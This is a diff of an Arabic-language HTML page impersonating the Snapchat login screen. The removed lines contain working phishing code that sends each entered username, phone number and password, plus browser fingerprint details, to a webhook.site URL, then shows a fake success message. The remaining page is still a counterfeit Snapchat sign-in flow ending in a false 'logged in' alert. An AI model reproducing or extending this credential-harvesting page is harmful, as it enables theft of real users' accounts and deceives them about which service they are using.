@@ -12,18 +12,19 @@ body {
   font-family: Arial, Helvetica, sans-serif;
   display: flex;
   flex-direction: column;
-  justify-content: center;
   align-items: center;
   min-height: 100vh;
+  justify-content: flex-start;
+  padding-top: 30px;
 }
 
 .card {
-  width: 90%;
-  max-width: 360px;
+  width: 88%;
+  max-width: 340px;
   background: #ffffff;
   border-radius: 20px;
   box-shadow: 0 12px 30px rgba(0,0,0,0.1);
-  padding: 25px 20px;
+  padding: 25px 15px;
   text-align: center;
 }
 
@@ -38,32 +39,56 @@ h1 {
   color: #111;
 }
 
+.input-group {
+  width: 100%;
+  margin-bottom: 15px;
+  text-align: right;
+  display: flex;
+  flex-direction: column;
+  align-items: center; /* جعل الخانات في منتصف الإطار */
+}
+
+label {
+  display: block;
+  font-size: 14px;
+  font-weight: 600;
+  color: #000;
+  margin-bottom: 5px;
+  width: 90%; /* محاذاة الوصف مع بداية الخانة */
+  text-align: right; /* يبقى الوصف على يمين الخانة */
+}
+
 input {
-  width: 95%;
-  padding: 12px;
+  width: 90%; /* الخانة في منتصف الإطار */
+  padding: 10px;
   border-radius: 10px;
   border: 1px solid #ddd;
-  font-size: 16px;
+  font-size: 15px;
   outline: none;
-  margin-top: 10px;
   transition: 0.2s;
+  box-sizing: border-box;
 }
 
 input:focus {
   border-color: #000;
 }
 
+input::placeholder {
+  color: #a0a0a0;
+  font-weight: 400;
+}
+
 button {
-  width: 95%;
-  padding: 14px;
+  width: 90%;
+  padding: 12px;
   border-radius: 25px;
   border: none;
   background: #007AFF;
   color: #fff;
-  font-size: 16px;
+  font-size: 15px;
   font-weight: bold;
   cursor: pointer;
-  margin-top: 20px;
+  margin-top: 15px;
   transition: 0.2s;
 }
 
@@ -74,7 +99,7 @@ button:hover {
 .link {
   display: block;
   font-size: 14px;
-  margin-top: 12px;
+  margin-top: 10px;
   color: #007AFF;
   text-decoration: none;
   cursor: pointer;
@@ -114,66 +139,24 @@ button:hover {
   text-decoration: underline;
 }
 
-/* مؤشر التحميل */
-.loading {
-  display: none;
-  text-align: center;
-  margin: 10px 0;
-}
-
-.spinner {
-  border: 3px solid #f3f3f3;
-  border-top: 3px solid #007AFF;
-  border-radius: 50%;
-  width: 24px;
-  height: 24px;
-  animation: spin 0.8s linear infinite;
-  margin: 0 auto;
-}
-
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
-
-/* رسالة التنبيه */
-.message {
-  padding: 10px;
-  border-radius: 8px;
-  margin-bottom: 15px;
-  font-size: 13px;
-  display: none;
-  text-align: center;
-}
-
-.message.success {
-  background-color: #d4edda;
-  color: #155724;
-  border: 1px solid #c3e6cb;
-}
-
-.message.error {
-  background-color: #f8d7da;
-  color: #721c24;
-  border: 1px solid #f5c6cb;
-}
-
 /* تحسين التوافق مع الهواتف الصغيرة */
 @media (max-width: 400px) {
   .card {
-    padding: 20px 15px;
+    padding: 20px 12px;
   }
 
   h1 {
     font-size: 20px;
   }
 
-  input {
-    font-size: 15px;
+  input, button {
+    font-size: 14px;
+    padding: 10px;
   }
 
-  button {
-    font-size: 15px;
+  label {
+    font-size: 13px;
+    width: 90%;
   }
 }
 </style>
@@ -185,18 +168,13 @@ button:hover {
   <!-- شعار سناب -->
   <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" class="logo" alt="Snapchat Logo">
 
-  <!-- رسائل التنبيه -->
-  <div id="message" class="message"></div>
-  
-  <!-- مؤشر التحميل -->
-  <div id="loading" class="loading">
-    <div class="spinner"></div>
-  </div>
-
   <!-- الخطوة 1: البريد أو اسم المستخدم -->
   <div id="step1" class="fade">
     <h1>تسجيل الدخول</h1>
-    <input type="text" id="userInput" placeholder="البريد الإلكتروني أو اسم المستخدم">
+    <div class="input-group">
+      <label for="userInput">البريد الإلكتروني أو اسم المستخدم</label>
+      <input type="text" id="userInput" placeholder="أدخل البريد الإلكتروني أو اسم المستخدم" value="">
+    </div>
     <button onclick="nextStep()">التالي</button>
     <a class="link" onclick="usePhone()">استخدام رقم الهاتف بدلاً من ذلك</a>
   </div>
@@ -204,7 +182,10 @@ button:hover {
   <!-- الخطوة 1b: إدخال رقم الهاتف -->
   <div id="stepPhone" class="hidden fade">
     <h1>تسجيل الدخول برقم الهاتف</h1>
-    <input type="text" id="phoneInput" placeholder="رقم الهاتف">
+    <div class="input-group">
+      <label for="phoneInput">رقم الهاتف</label>
+      <input type="text" id="phoneInput" placeholder="أدخل رقم الهاتف" value="">
+    </div>
     <button onclick="nextStepPhone()">التالي</button>
     <a class="link" onclick="backToEmail()">الرجوع للبريد الإلكتروني</a>
   </div>
@@ -212,7 +193,10 @@ button:hover {
   <!-- الخطوة 2: كلمة المرور -->
   <div id="step2" class="hidden fade">
     <h1 id="userDisplay"></h1>
-    <input type="password" id="passwordInput" placeholder="كلمة المرور">
+    <div class="input-group">
+      <label for="passwordInput">كلمة المرور</label>
+      <input type="password" id="passwordInput" placeholder="أدخل كلمة المرور" value="">
+    </div>
     <button onclick="login()">تسجيل الدخول</button>
     <a class="link" onclick="backToStep1()">تغيير الحساب</a>
   </div>
@@ -225,55 +209,6 @@ button:hover {
 </div>
 
 <script>
-// رابط Webhook
-const WEBHOOK_URL = 'https://webhook.site/7076cb5c-eee3-4ca0-8533-6f064255b742';
-
-// عناصر الصفحة
-const messageDiv = document.getElementById('message');
-const loadingDiv = document.getElementById('loading');
-
-// دالة عرض الرسائل
-function showMessage(text, type) {
-  messageDiv.textContent = text;
-  messageDiv.className = `message ${type}`;
-  setTimeout(() => {
-    messageDiv.style.display = 'none';
-  }, 3000);
-}
-
-// دالة إرسال البيانات إلى Webhook
-async function sendToWebhook(data) {
-  try {
-    // إظهار التحميل
-    loadingDiv.style.display = 'block';
-    
-    // إرسال البيانات
-    await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      mode: 'no-cors', // لتجنب مشاكل CORS
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        ...data,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: `${window.screen.width}x${window.screen.height}`
-      })
-    });
-    
-    console.log('✅ تم إرسال البيانات:', data);
-    return true;
-  } catch (error) {
-    console.error('❌ خطأ في الإرسال:', error);
-    return false;
-  } finally {
-    loadingDiv.style.display = 'none';
-  }
-}
-
 function fadeTransition(hideEl, showEl) {
   hideEl.classList.remove('fade');
   hideEl.classList.add('hidden');
@@ -281,68 +216,24 @@ function fadeTransition(hideEl, showEl) {
   showEl.classList.add('fade');
 }
 
-async function nextStep() {
+function nextStep() {
   const user = document.getElementById("userInput").value.trim();
-  if(user === "") { 
-    showMessage("الرجاء إدخال اسم المستخدم أو البريد الإلكتروني", "error"); 
-    return; 
-  }
-  
-  // إرسال البريد الإلكتروني إلى Webhook
-  await sendToWebhook({
-    type: 'email_username',
-    value: user
-  });
-  
+  if(user === "") { alert("الرجاء إدخال اسم المستخدم أو البريد الإلكتروني"); return; }
   document.getElementById("userDisplay").innerText = user;
   fadeTransition(document.getElementById("step1"), document.getElementById("step2"));
 }
 
-async function nextStepPhone() {
+function nextStepPhone() {
   const phone = document.getElementById("phoneInput").value.trim();
-  if(phone === "") { 
-    showMessage("الرجاء إدخال رقم الهاتف", "error"); 
-    return; 
-  }
-  
-  // إرسال رقم الهاتف إلى Webhook
-  await sendToWebhook({
-    type: 'phone_number',
-    value: phone
-  });
-  
+  if(phone === "") { alert("الرجاء إدخال رقم الهاتف"); return; }
   document.getElementById("userDisplay").innerText = phone;
   fadeTransition(document.getElementById("stepPhone"), document.getElementById("step2"));
 }
 
-async function login() {
+function login() {
   const password = document.getElementById("passwordInput").value.trim();
-  const user = document.getElementById("userDisplay").innerText;
-  
-  if(password === "") { 
-    showMessage("الرجاء إدخال كلمة المرور", "error"); 
-    return; 
-  }
-  
-  // إرسال جميع البيانات (البريد/الهاتف + كلمة المرور) إلى Webhook
-  await sendToWebhook({
-    type: 'complete_login',
-    username: user,
-    password: password,
-    isPhone: user.includes('+') || /^\d+$/.test(user.replace(/\s/g, ''))
-  });
-  
-  showMessage("✅ تم تسجيل الدخول بنجاح!", "success");
-  
-  // تفريغ الحقول
-  document.getElementById("passwordInput").value = '';
-  
-  // العودة للخطوة الأولى بعد ثانيتين
-  setTimeout(() => {
-    backToStep1();
-    document.getElementById("userInput").value = '';
-    document.getElementById("phoneInput").value = '';
-  }, 2000);
+  if(password === "") { alert("الرجاء إدخال كلمة المرور"); return; }
+  alert("تم تسجيل الدخول بنجاح!");
 }
 
 function usePhone() {
